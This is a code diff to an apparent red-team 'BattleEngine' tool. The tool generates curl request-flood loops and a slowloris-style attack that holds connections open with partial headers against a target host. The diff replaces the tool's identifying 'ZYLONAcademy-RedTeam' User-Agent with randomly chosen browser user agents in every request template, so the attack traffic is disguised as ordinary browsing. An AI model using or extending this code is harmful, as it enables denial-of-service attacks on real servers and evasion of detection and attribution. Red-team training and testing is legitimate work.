@@ -56,6 +56,9 @@ from rich.table import Table
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
 from rich import box
 
+from core.var import USER_AGENTS
+from core.shared_infra import shared_session, regex_cache
+
 console = Console()
 
 
@@ -997,7 +1000,7 @@ class BattleEngine:
             for i in $(seq 1 5); do
                 curl -s -o /dev/null -w '%{http_code}'
                     -X GET
-                    -H 'User-Agent: ZYLONAcademy-RedTeam'
+                    -H 'User-Agent: {random.choice(USER_AGENTS)}'
                     'http://192.168.1.100/?zylon=$RANDOM'
                     2>/dev/null && echo '';
                 sleep 0.1;
@@ -1022,7 +1025,7 @@ class BattleEngine:
                 f"for i in $(seq 1 {count}); do "
                 f"curl -s -o /dev/null -w '%{{http_code}}' "
                 f"-X {method} "
-                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
+                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                 f"-H 'X-Test-Request: $i' "
                 f"'{target_url}{path}?zylon=$RANDOM' "
                 f"2>/dev/null && echo ''; "
@@ -1035,7 +1038,7 @@ class BattleEngine:
                 f"for i in $(seq 1 {count}); do "
                 f"curl -s -o /dev/null -w '%{{http_code}}\\n' "
                 f"-X {method} "
-                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
+                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                 f"-H 'X-Test-Request: $i' "
                 f"'{target_url}{path}?zylon=$RANDOM' "
                 f"2>/dev/null; "
@@ -1061,7 +1064,7 @@ class BattleEngine:
             cmd = (
                 f"for i in $(seq 1 {count}); do "
                 f"curl -s -o /dev/null -w '%{{http_code}} ' "
-                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
+                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                 f"'{target_url}{path}?q=$RANDOM' "
                 f"--max-time 5 2>/dev/null; "
                 f"done; echo ''"
@@ -1070,7 +1073,7 @@ class BattleEngine:
             cmd = (
                 f"for i in $(seq 1 {count}); do "
                 f"curl -s -o /dev/null -w '%{{http_code}} ' "
-                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
+                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                 f"'{target_url}{path}?q=$RANDOM' "
                 f"--max-time 5 2>/dev/null; "
                 f"done; echo ''"
@@ -1105,7 +1108,7 @@ class BattleEngine:
             # Open slow connection - send partial headers (NO \\r\\n\\r\\n at end)
             f"(echo -ne 'GET /slowloris-test-{random.randint(1000,9999)} HTTP/1.1\\r\\n"
             f"Host: {target_host}\\r\\n"
-            f"User-Agent: ZYLONAcademy-RedTeam\\r\\n"
+            f"User-Agent: {random.choice(USER_AGENTS)}\\r\\n"
             f"X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
             # Wait 3 seconds - server is still holding the connection open
             f"sleep 3; "
